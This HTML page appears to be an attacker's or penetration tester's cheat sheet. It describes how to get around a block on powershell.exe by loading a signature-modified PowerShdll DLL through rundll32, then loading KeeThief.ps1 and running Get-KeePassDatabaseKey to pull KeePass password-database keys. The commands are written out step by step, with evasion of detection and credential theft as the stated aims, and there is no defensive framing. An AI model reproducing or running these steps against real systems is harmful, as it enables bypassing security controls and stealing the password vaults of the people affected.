<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Blcoked Powershell Keethief (or anything)</title>
</head><body>So in the situation we are not able to execute powershell.exe<br/>
<img height="63" src="image.png" width="600"/><br/>
<br/>
<br/>
This tool will allow us to bypass this annoying hinderance ;)<ul><li style="list-style-type: none"/>
</ul>
<a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a>- (only need the release)<br/>
<br/>
The exe is not generally a viable option so we can use the ps1 file instead<br/>
<br/>
<br/>
1. Changing the dll signature (related article in folder)<br/>
<br/>
2. import the PowerShdll.dll file with <b>modified</b>signature<br/>
<br/>
3. CMD &gt; rundll32.exe PowerShdll.dll, main<br/>
<br/>
**If this worked correctly a new shell should pop  |  This shell should accept powershell commands**<br/>
<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">*load it*</li>
<li style="list-style-type: none">&gt; . &quot;.\KeeThief.ps1&quot;</li>
</ul>
</li>
</ul>
<br/>
&gt; Get-KeePassDatabaseKey<br/>
<br/>
This can be done with any ps1 module but using KeeThief as an example<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Conjoining all payload related files<br/>
<img src="image 2.png"/></body></html>